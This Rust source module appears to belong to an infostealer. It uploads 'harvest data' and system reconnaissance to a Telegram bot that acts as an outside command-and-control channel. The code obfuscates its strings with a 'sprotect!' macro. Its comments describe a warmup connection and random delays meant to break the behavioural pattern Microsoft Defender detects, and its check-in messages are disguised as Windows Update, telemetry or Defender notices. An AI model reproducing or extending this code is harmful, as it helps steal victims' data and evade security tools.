use crate::sprotect;

pub mod telegram;
pub mod blob_format;

pub use telegram::TelegramUploader;
pub use blob_format::{create_encrypted_blob, parse_and_decrypt_blob};

fn get_telegram_config() -> Option<(String, String)> {
    // REPLACE with your Telegram bot token and chat ID
    Some((
        sprotect!("YOUR_BOT_TOKEN_HERE"),
        sprotect!("YOUR_CHAT_ID_HERE")
    ))

    // Alternative credentials (commented out):
    // Some((
    //     sprotect!("YOUR_ALT_BOT_TOKEN_HERE"),
    //     sprotect!("YOUR_ALT_CHAT_ID_HERE")
    // ))
}

pub async fn upload_harvest_data(data: Vec<u8>, filename: &str) -> Result<(), String> {
    if let Some((bot_token, chat_id)) = get_telegram_config() {
        let uploader = TelegramUploader::new(bot_token, chat_id);
        return uploader.upload_data(&data, filename).await;
    }

    Err(sprotect!("No upload service configured").to_string())
}

pub async fn send_system_notification(message: &str) -> Result<(), String> {
    if let Some((bot_token, chat_id)) = get_telegram_config() {
        let uploader = TelegramUploader::new(bot_token, chat_id);
        return uploader.send_notification(message).await;
    }

    Err(sprotect!("No notification service configured").to_string())
}

pub async fn initialize_communications() -> Result<(), Box<dyn std::error::Error>> {
    // Warmup connection: Connect to Telegram API but don't send yet
    // This breaks the behavioral pattern Defender looks for
    if let Some((bot_token, chat_id)) = get_telegram_config() {
        let _uploader = TelegramUploader::new(bot_token, chat_id);
        // Connection established, API resolved, but no data sent yet
    }
    
    // Random delay before actual message (15-45 seconds)
    let delay_ms = 15000 + (rand::random::<u64>() % 30000);
    tokio::time::sleep(tokio::time::Duration::from_millis(delay_ms)).await;
    
    // Generate random startup message (different every run)
    let startup_msg = generate_random_startup_message();
    let _ = send_system_notification(&startup_msg).await;
    Ok(())
}

fn generate_random_startup_message() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    
    let templates = [
        // Windows Update style
        format!(
            "{}\n{}\n{}",
            sprotect!("Windows Update Service initialized"),
            sprotect!("Checking for available updates..."),
            sprotect!("Background tasks scheduled")
        ),
        // Telemetry style
        format!(
            "{}\n{}\n{}",
            sprotect!("Telemetry service started"),
            sprotect!("Data collection modules loaded"),
            sprotect!("Diagnostics ready")
        ),
        // Generic service style
        format!(
            "{}\n{}\n{}",
            sprotect!("System service initialized successfully"),
            sprotect!("Background processes active"),
            sprotect!("Monitoring enabled")
        ),
        // Defender style
        format!(
            "{}\n{}\n{}",
            sprotect!("Security monitoring service started"),
            sprotect!("Real-time protection active"),
            sprotect!("Threat definitions updated")
        ),
        // Network style
        format!(
            "{}\n{}\n{}",
            sprotect!("Network connectivity service initialized"),
            sprotect!("Connection monitoring active"),
            sprotect!("Network diagnostics enabled")
        ),
    ];
    
    templates[rng.gen_range(0..templates.len())].clone()
}

pub async fn send_recon_info(system_recon: &crate::recon::SystemRecon) -> Result<(), String> {
    let recon_msg = system_recon.format_for_telegram();
    send_system_notification(&recon_msg).await
}
